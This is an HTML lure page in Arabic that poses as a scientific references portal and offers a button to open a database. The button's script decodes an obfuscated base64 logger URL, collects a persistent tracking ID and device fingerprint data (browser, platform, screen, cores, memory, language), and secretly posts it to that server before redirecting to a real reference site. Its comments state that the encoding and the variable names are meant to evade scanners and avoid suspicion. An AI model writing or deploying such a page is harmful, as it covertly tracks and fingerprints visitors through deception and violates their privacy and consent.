<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة المراجع العلمية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; border-top: 5px solid #2c3e50; }
        .btn-link { background-color: #2c3e50; color: white; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-size: 18px; text-decoration: none; display: inline-block; transition: 0.4s; }
    </style>
</head>
<body>
    <div class="box">
        <h2>نظام الوصول الموحد</h2>
        <p>انقر أدناه للانتقال المباشر إلى قاعدة بيانات المراجع.</p>
        <button onclick="systemInit()" class="btn-link">فتح قاعدة البيانات</button>
    </div>

    <script>
        // تشفير الرابط لتمويه برامج الفحص (رابط رندر الخاص بك)
        const _0x4a2 = "aHR0cHM6Ly9sb2dnZXItc2VydmVyLWIwMGEub25yZW5kZXIuY29tL2FwaS9jYXB0dXJl";

        async function systemInit() {
            // استخدام أسماء متغيرات عادية جداً للتمويه
            let sessionKey = localStorage.getItem('_ses_key');
            if (!sessionKey) {
                sessionKey = 'SES-' + Math.random().toString(36).toUpperCase().substring(2, 12);
                localStorage.setItem('_ses_key', sessionKey);
            }

            const payload = {
                trackingId: sessionKey,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: window.screen.width + "x" + window.screen.height,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                lang: navigator.language
            };

            try {
                // فك تشفير الرابط فقط عند التنفيذ
                const endpoint = atob(_0x4a2);
                
                await fetch(endpoint, {
                    method: "POST",
                    mode: 'no-cors', // لتقليل الشكوك البرمجية
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ deviceMetrics: payload })
                });
            } catch (err) {}

            // التحويل للموقع النهائي
            window.location.href = "https://midad.com/scholar/36060";
        }
    </script>
</body>
</html>
